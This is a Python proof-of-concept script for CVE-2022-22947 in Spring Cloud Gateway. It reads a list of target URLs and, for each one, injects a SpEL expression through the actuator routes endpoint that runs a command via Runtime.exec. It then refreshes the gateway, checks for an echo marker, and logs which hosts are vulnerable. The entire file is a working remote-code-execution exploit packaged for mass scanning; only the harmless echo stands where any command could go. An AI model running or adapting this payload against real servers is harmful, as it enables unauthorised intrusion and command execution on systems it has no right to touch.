#!/usr/bin/env python
# encoding: utf-8
'''
@Author         : xd
@Date           : 2022-03-04 22:13
@Description    : Spring-Cloud-Gateway-CVE-2022-22947.
'''
import random
import requests
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def test(link):
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    proxies = {
        "http": "//127.0.0.1:8080"
    }

    val = random.randint(100000, 999999)
    gateway = str(val)

    payload = '''{\r
      "id": "''' + gateway + '''",\r
      "filters": [{\r
        "name": "AddResponseHeader",\r
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"echo\\",\\"qwe123asd456\\"}).getInputStream()))}"}\r
        }],\r
      "uri": "http://example.com",\r
      "order": 0\r
    }'''
    try:
        re1 = requests.post(url=link + "/actuator/gateway/routes/" + gateway, data=payload, headers=headers1, json=json,
                            timeout=10, verify=False)
        re2 = requests.post(url=link + "/actuator/gateway/refresh", headers=headers2, timeout=10, verify=False)
        re3 = requests.get(url=link + "/actuator/gateway/routes/" + gateway, headers=headers2, timeout=10,
                           verify=False).text
        re4 = requests.delete(url=link + "/actuator/gateway/routes/" + gateway, headers=headers2, timeout=10,
                              verify=False)
        re5 = requests.post(url=link + "/actuator/gateway/refresh", headers=headers2, timeout=10, verify=False)
        print(re3)
        if "qwe123asd456" in re3 and "route_id" in re3:
            return 1
        else:
            return 0
    except:
        return -1


if __name__ == "__main__":
    print("""
    _____________   _______________         _______________   ________ ________  
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \\\\_____  \ 
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/ /  ____/ 
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \/       \ 
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \_______ \\
        \/                  \/                  \/     \/         \/       \/
         ________ ________  ________  ______________   ____  ___________   
         \_____  \\\\_____  \/   __   \/  |  \______  \  \   \/  /\______ \  
  ______  /  ____/ /  ____/\____    /   |  |_  /    /   \     /  |    |  \ 
 /_____/ /       \/       \   /    /    ^   / /    /    /     \  |    `   \\
         \_______ \_______ \ /____/\____   | /____/____/___/\  \/_______  /
                 \/       \/            |__|     /_____/     \_/        \/ 
                                                            Author : xd
                                                             CSDN  : https://blog.csdn.net/xd_2021

usage: python3 poc.py urlfile
""")

    if (len(sys.argv) > 1):
        UrlsPath = sys.argv[1]
        print("urlspath : " + UrlsPath)
        urls = open(UrlsPath).read().split("\n")
        for url in urls:
            file = open("gateway.log", "a")
            num = test(url)
            if num == 1:
                file.write("[+] " + url + "\n")
            elif num == 0:
                file.write("[-] " + url + "\n")
            else:
                file.write("[*] " + url + "\n")
            file.close()
    else:
        exit()
